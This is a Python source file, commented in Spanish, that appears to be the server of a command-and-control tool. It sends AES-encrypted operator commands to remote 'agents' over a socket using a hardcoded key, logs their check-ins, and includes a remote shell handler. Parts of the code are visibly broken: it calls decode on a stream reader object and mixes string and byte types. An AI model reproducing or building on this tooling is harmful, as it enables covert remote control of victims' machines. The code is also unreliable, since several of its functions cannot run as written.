import os
import mss
import shutil
import sys
import asyncio
from socket import socket

project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
sys.path.insert(0, project_root)
from crypto.aes_encryptor import AESEncryptor

class crocodile():
   def __init__(self):
        key=b"thisis16byteskey"
        self.encryptor = AESEncryptor(key)
        self.sessions = {} 

   def start(self, current_dir:socket):
        """Inicia el servidor y escucha check-ins de agentes.""" 
        while True:
          comand = input(current_dir).encode("utf-8")
          decrypted = self.encryptor.encrypt(comand.decode())
          current_dir.send(decrypted)
          print(decrypted)
          res = current_dir.recv(4096)
          if res:
            decrypted_response = self.encryptor.decrypt(res) 
            agent_id, command = self.process_check_in(decrypted_response)
            print(agent_id,command.decode())


   def process_check_in(self, data: str) -> tuple:
        """Procesa el check-in de un agente."""
        agent_id, metadata = data.split("|")
        self.sessions[agent_id] = metadata
        return agent_id, "collect_info" 

   async def sh(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter, message):
        while True:
            try:
                print(message)
                # Verificamos que `reader` es instancia de asyncio.StreamReader
                if not isinstance(reader, asyncio.StreamReader):
                    raise TypeError("reader debe ser una instancia de asyncio.StreamReader")

                # Leer datos de manera asíncrona
                data = reader
                if not data:
                    print("Cliente desconectado.")
                    break  # Salimos del bucle si no hay datos

                # Decodificar el mensaje
                command = data.decode().strip()
                print(f"Comando recibido: {command}")
                if command.startswith("cd "):
                    path = command[3:].strip()

                    if os.path.exists(path) and os.path.isdir(path):
                        os.chdir(path)
                        current_dir = os.getcwd()
                        encrypted_response = self.encryptor.encrypt(current_dir.encode())
                    else:
                        encrypted_response = self.encryptor.encrypt(b"not found or is not a directory")
                    
                    writer.write(encrypted_response)
                    await writer.drain()  # Enviar los datos

            except (asyncio.IncompleteReadError, ConnectionResetError, BrokenPipeError):
                print("Cliente desconectado de forma inesperada.")
                break
            except Exception as e:
                print(f"Error en el shell: {e}")
                break 